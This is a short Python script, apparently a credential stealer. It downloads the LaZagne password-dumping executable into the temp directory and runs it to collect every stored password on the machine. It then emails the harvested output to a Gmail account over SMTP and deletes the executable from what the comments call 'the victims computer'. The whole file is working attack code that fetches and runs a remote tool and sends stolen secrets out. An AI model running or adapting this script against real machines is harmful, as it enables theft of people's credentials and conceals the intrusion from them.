
import subprocess
import smtplib
import requests
import os
import tempfile

# Account information for email address
email = "Email Account"  # os.environ.get("MAILACCOUNT")
passwd = "Email Password"  # os.environ.get("MAILPWD")
# The command tha will be executed
command = ".\lazagne.exe all"
# The url of the executable or file to be download
url = "https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe"


def send_mail(email, password, message):
    """ This function allow me to send mails using the gmail server and my personal email to send information to my email

    Args:
        email (string): My email account that is going to send a receive the message
        password (String): The password of the mail account
        message (String): The output of the command prompt 
    """
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


def download(url):
    """This Function will download any file from the url provided

    Args:
        url (string): the url of the file to download
    """
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as f:
        f.write(get_response.content)
    print("[+] Downloading...")


if __name__ == '__main__':
    # Create a temporary directory
    temp_dir = tempfile.gettempdir()
    # Change the working directory to the temporary directory
    os.chdir(temp_dir)
    # Download the file that is going to be executed
    download(url)
    # Run the command and store the output
    result = subprocess.check_output(command, shell=True)
    # Finally we send the mail with the password of the wifi network
    send_mail(email, passwd, result)
    # After sending the email we remove the file from the victims computer
    os.remove('lazagne.exe')
    # Print message that the message was sent
    print("[+] Message was sent to your email address")
